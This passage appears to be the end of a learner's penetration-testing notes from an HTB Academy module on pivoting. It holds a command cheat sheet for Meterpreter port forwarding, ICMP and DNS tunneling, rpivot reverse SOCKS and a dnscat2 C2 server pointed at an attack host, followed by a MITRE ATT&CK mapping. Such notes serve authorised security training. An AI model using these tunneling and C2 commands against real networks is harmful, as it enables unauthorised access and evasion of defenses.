| `meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19` | Meterpreter local port forward to RDP |
| `meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18` | Meterpreter reverse port forward |
| `sudo ./ptunnel-ng -p pivot_ip -l2222 -r pivot_ip -R22` | Start ptunnel-ng client — ICMP tunnel to pivot SSH |
| `ssh -p2222 -lubuntu 127.0.0.1` | SSH through ICMP tunnel |
| `plink -ssh -D 9050 user@pivot` | Windows plink SOCKS dynamic forward |
| `python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0` | Start rpivot server on attack host |
| `python2 client.py --server-ip attack_ip --server-port 9999` | Connect rpivot client from pivot host |
| `sudo ruby dnscat2.rb --dns host=attack_ip,port=53,domain=domain.local --no-cache` | Start dnscat2 DNS C2 server |

---

## MITRE ATT&CK Mapping

| Technique | Sub-Technique | Tool/Method |
|-----------|---------------|-------------|
| T1090 | T1090.001 | Internal Proxy — Chisel, ligolo-ng, rpivot, sshuttle |
| T1090 | T1090.002 | External Proxy — rpivot reverse SOCKS, dnscat2 |
| T1090 | T1090.003 | Multi-hop Proxy — chained proxychains, double pivot |
| T1572 | — | Protocol Tunneling — SSH SOCKS, Chisel HTTP/SSH, dnscat2 DNS, ptunnel-ng ICMP |
| T1021 | T1021.001 | Remote Services: RDP — xfreerdp via SOCKS/portfwd |
| T1021 | T1021.004 | Remote Services: SSH — SSH local/dynamic/remote forwarding |
| T1071 | T1071.004 | Application Layer Protocol: DNS — dnscat2 C2 over DNS |
| T1095 | — | Non-Application Layer Protocol — ptunnel-ng ICMP tunneling |
| T1571 | — | Non-Standard Port — Chisel on port 1234, Meterpreter on custom ports |
| T1059 | T1059.001 | PowerShell — dnscat2-powershell client on Windows |
| T1105 | — | Ingress Tool Transfer — scp/Python HTTP server to transfer Chisel, ligolo-ng, ptunnel-ng |
| T1133 | — | External Remote Services — pivot through SSH, RDP, WinRM |

---

*Module completed as part of the HTB Academy CPTS path.*
*Penetration Tester role in India | Target: January 2027*
